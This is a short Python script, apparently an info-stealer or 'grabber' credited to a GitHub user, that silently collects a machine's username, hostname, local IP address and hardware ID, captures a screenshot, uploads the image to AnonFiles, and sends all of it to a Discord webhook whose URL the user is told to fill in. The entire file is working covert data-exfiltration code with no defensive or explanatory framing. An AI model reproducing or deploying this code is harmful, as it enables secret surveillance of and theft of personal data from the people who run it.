import socket
import getpass
import requests
import json
from PIL import ImageGrab
import io
import base64
import time
import os
import uuid

username = None
try:
    username = getpass.getuser()
except Exception:
    pass

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
uuid_str = str(uuid.getnode())

# Take a screenshot
img = ImageGrab.grab()
img_bytes = io.BytesIO()
img.save(img_bytes, format='PNG')
img_bytes = img_bytes.getvalue()

# Upload the screenshot to AnonFiles
response = requests.post('https://api.anonfiles.com/upload', files={'file': ('screenshot.png', img_bytes)})
response_json = response.json()
if response_json['status']:
    screenshot_url = response_json['data']['file']['url']['short']
else:
    screenshot_url = 'Error uploading screenshot'

# Create embed object
embed = {
    "title": "User Login",
    "description": f"**Username:** {username or 'Unknown'}\n**Hostname:** {hostname}\n**Local IP:** {local_ip}\n**UUID:** {uuid_str}\n**Screenshot:** {screenshot_url}",
    "color": 16711680,
        "footer": {
        "icon_url": "https://avatars.githubusercontent.com/u/61671297?v=4",
        "text": "github.com/nismo1337"
    }
}
# Create payload object with embed
payload = {
    "username": "Your Bot Name",
    "embeds": [
        embed
    ]
}
# Send POST request to Discord webhook URL
url = "put ur webhook here :D"
headers = {'Content-Type': 'application/json'}
response = requests.post(url, headers=headers, data=json.dumps(payload))

print(response.text)
